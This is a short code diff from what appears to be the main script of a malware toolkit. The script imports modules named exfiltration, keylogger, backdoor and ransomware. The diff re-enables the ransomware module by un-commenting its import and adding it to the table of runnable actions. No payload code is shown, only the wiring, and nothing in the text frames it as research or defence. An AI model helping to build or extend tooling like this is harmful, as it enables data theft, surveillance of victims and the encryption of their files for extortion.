@@ -11,7 +11,7 @@ from modules import exfiltration
 from modules import keylogger
 from modules import backdoor
 from modules import instructions
-# from modules import ransomware
+from modules import ransomware
 
 ###########################################################################################################################
 #################################################     INITIALIZATIONS     #################################################
@@ -35,7 +35,7 @@ def main():
         "keylogger": keylogger.run,
         "backdoor": backdoor.run,
         "instructions": instructions.run,
-        # "ransomware": ransomware.run,
+        "ransomware": ransomware.run,
     }
 
     # First step
